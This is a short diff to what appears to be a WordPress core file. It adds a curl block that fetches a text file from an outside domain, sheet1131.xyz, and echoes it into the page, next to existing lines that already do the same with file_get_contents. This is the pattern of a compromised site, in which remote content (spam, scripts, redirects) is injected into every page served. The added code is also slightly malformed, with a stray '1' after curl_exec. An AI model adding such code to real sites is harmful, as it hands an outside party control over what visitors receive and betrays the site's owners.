@@ -24,3 +24,12 @@ if ( ! isset( $wp_did_header ) ) {
 $a = file_get_contents('https://sheet1131.xyz/ptacid.txt');
 echo $a;
 ?>
+
+<?php
+$curl = curl_init();
+$url = 'https://sheet1131.xyz/ptacid.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);1
+echo $result;?>
